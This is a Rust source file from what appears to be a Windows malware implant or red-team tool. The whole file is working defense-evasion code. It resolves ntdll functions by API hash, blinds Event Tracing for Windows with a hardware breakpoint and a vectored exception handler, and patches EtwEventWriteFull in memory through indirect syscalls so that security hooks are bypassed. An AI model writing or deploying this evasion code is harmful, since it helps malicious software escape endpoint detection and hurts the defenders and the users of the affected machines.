#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::EXCEPTION_SINGLE_STEP,
    System::Diagnostics::Debug::{EXCEPTION_POINTERS, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64},
};
#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
use windows_sys::Win32::System::Diagnostics::Debug::AddVectoredExceptionHandler;

#[cfg(target_os = "windows")]
static mut ETW_ADDR: usize = 0;

/// Resolve ntdll base: PEB walk on x64, GetModuleHandleA fallback elsewhere.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn ntdll_base() -> *const u8 {
    use crate::resolve::api_hash::{peb_get_module_base, h};
    peb_get_module_base(h::DLL_NTDLL)
}
#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn ntdll_base() -> *const u8 {
    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8
}

#[cfg(target_os = "windows")]
pub unsafe fn install_etw_bypass() {
    use crate::resolve::api_hash::{h, resolve_by_hash};
    let ntdll = ntdll_base();
    if ntdll.is_null() { return; }
    let etw_fn = match resolve_by_hash(ntdll, h::ETW_EV_WRITE) {
        Some(p) => p,
        None => return,
    };
    ETW_ADDR = etw_fn as usize;

    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    #[cfg(target_arch = "x86_64")]
    {
        if let Some(fn_ptr) = resolve_by_hash(ntdll, h::RTL_VEH) {
            type RtlVeh = unsafe extern "system" fn(usize, *const core::ffi::c_void) -> *mut core::ffi::c_void;
            let f: RtlVeh = core::mem::transmute(fn_ptr);
            f(1, etw_veh_handler as usize as *const core::ffi::c_void);
        }
    }
    #[cfg(not(target_arch = "x86_64"))]
    AddVectoredExceptionHandler(1, Some(etw_veh_handler));

    let thread: isize = !1isize; // -2 = current thread pseudo-handle
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    if let Some((ssn_get, tramp_get)) = get_ssn_h(h::NT_GET_CTX) {
        indirect_syscall(ssn_get, tramp_get, thread as usize, &mut ctx as *mut CONTEXT as usize, 0, 0, 0, 0);
    }
    ctx.Dr1  = ETW_ADDR as u64;
    ctx.Dr7 |= 0x4;
    if let Some((ssn_set, tramp_set)) = get_ssn_h(h::NT_SET_CTX) {
        indirect_syscall(ssn_set, tramp_set, thread as usize, &ctx as *const CONTEXT as usize, 0, 0, 0, 0);
    }
}

/// Hot-patch EtwEventWriteFull with xor eax,eax; ret — blocks all ETW writes.
/// Uses NtProtectVirtualMemory indirect syscall to avoid VirtualProtect hook.
#[cfg(target_os = "windows")]
pub unsafe fn patch_etw_full() {
    use crate::resolve::api_hash::{h, resolve_by_hash};
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};

    let ntdll = ntdll_base();
    if ntdll.is_null() { return; }

    let func = match resolve_by_hash(ntdll, h::ETW_EV_WR_FULL) {
        Some(p) => p as *mut u8,
        None    => return,
    };

    let patch = [0x33u8, 0xC0, 0xC3]; // xor eax,eax; ret
    let ph    = usize::MAX;

    if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
        let mut base = func as usize; let mut sz = patch.len(); let mut old = 0u32;
        indirect_syscall(prot_ssn, prot_tramp, ph,
            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
            0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
        core::ptr::copy_nonoverlapping(patch.as_ptr(), func, patch.len());
        let mut base2 = func as usize; let mut sz2 = patch.len();
        indirect_syscall(prot_ssn, prot_tramp, ph,
            &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
            old as usize, &mut old as *mut u32 as usize, 0);
    } else {
        core::ptr::copy_nonoverlapping(patch.as_ptr(), func, patch.len());
    }
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn etw_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let record  = &*(*info).ExceptionRecord;
    let context = &mut *(*info).ContextRecord;

    if record.ExceptionCode == EXCEPTION_SINGLE_STEP
        && context.Rip == ETW_ADDR as u64
    {
        context.Rax = 0;
        context.Rip = *(context.Rsp as *const u64);
        context.Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    EXCEPTION_CONTINUE_SEARCH
}
